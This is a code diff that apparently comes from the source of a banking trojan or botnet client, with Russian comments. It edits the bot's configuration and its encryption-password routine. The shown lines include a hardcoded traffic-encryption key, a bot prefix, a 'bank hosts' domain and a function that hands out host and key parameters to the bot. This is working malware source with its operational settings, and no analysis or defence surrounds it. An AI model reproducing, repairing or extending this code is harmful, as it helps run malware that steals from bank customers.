@@ -66,7 +66,6 @@ namespace CONFIGDEBUGSTRINGS
 	// Основной пароль бота. Весь трафик будет шифроваться этим паролем
 	//----------------------------------------------------------------------------
 	char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;
-	#define MainPasswordNameHash 0x618ADDBE /*MAIN_PASSWORD*/
 
 	//----------------------------------------------------------------------------
 	// Имя бот плага.
@@ -92,7 +91,7 @@ namespace CONFIGDEBUGSTRINGS
 		char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zika.in\0";
 	#endif
 
-	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
+	PCHAR MainPassword    = "bRS8yYQ0APq9xfzC";
 	char BOT_PREFIX[]     = "qznjsvqqqtq";
 	PCHAR DebugDelay      = "1";
 
@@ -603,19 +602,18 @@ PCHAR GetMainPassword(bool NotNULL)
 {
 	// Функция возвращает пароль шифрования
 	PCHAR Passw = NULL;
-	#ifdef DEBUGCONFIG
-		Passw = STR::New(DebugPassword);
-	#else
-		// Проверяем задан ли в боте пароль
-		if (CalcHash(MainPassword) != MainPasswordNameHash)
-		{
-			Passw = STR::Alloc(StrCalcLength(MainPassword));
+
+	// Проверяем задан ли в боте пароль
+	if (!STRA::IsEmpty(MainPassword) && STRA::Hash(MainPassword) != BOTPARAM_HASH_PASSWORD)
+	{
+		Passw = STR::Alloc(STRA::Length(MainPassword));
+        if (BOTPARAM_ENCRYPTED_PASSWORD)
 			Decrypt(MainPassword, Passw);
-		}
-	#endif
+	}
+
 
 	// В случае необходимости возвращаем cтандартный пароль
-	if (NotNULL && STR::IsEmpty(Passw))
+	if (NotNULL && STRA::IsEmpty(Passw))
 	{
     	Passw = STR::New((PCHAR)DefaultPassword);
     }
@@ -662,7 +660,7 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 		switch (ParamID) {
 			case BOT_PARAM_PREFIX:       Value = BOT_PREFIX;  break;
 			case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
-			case BOT_PARAM_KEY:          Value = DebugPassword; break;
+			case BOT_PARAM_KEY:          Value = MainPassword; break;
 			case BOT_PARAM_DELAY:        Value = DebugDelay; break;
 			#ifdef USE_BANKING_HOSTS
 				case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
